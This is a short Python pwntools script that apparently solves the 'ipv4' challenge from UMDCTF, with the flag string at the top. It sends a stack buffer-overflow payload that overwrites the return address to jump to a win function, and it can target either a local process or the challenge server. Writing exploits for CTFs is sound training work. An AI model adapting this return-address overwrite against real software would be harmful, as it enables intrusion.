# UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}

#!/usr/bin/env python3
from pwn import *

PORT =  30308
HOST = "challs.umdctf.io"
e = context.binary = ELF('./ipv4', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x403132
            b*0x403239
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return e.process()

p = conn()

# GDB()
dum = b"d1nhdwc\0"
ret = 0x0000000000403244
p.sendlineafter(b"ASN Prefix?\n", dum)

pl = b"..." + b"A"*(0x68-3) + p64(ret) + p64(e.sym.win)
p.sendlineafter(b"Source Host Address?\n", pl)
p.sendlineafter(b"ASN Prefix?\n", dum)
p.sendlineafter(b"Destination Host Address?\n", b"..." + b"A"*45)

p.interactive()